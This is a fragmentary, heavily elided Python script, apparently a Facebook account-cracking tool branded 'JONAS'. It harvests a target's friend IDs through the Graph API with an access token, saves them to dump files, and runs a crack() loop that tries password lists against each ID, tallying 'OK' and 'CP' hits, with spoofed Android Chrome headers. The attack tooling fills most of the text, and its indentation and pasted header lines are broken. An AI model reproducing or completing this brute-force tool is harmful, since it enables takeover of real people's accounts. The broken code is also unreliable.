...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mJONAS  ')
...
def login_lagi334():
	try:
		...
		print(f'  {u}[{h}JONAS  {u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
class teman_teman:
    def __init__(self):
        ...
        if pl in ['1','01','m','M','a']:
            ...
            self.files = ('JONASdump%s.txt'%(self.target))
            ...
            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={tokenku}'
            self.files = ('JONASdumpnew%s.txt'%(self.target))
            file_dump = self.files
            open(self.files,'w').write('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[JONAS ]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}][{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
           ...
           sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"
            ...
            sec-ch-ua-mobile: 
            sec-ch-ua-platform: 
            User-Agent: Mozilla/5.0 (Linux; Android 12; SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
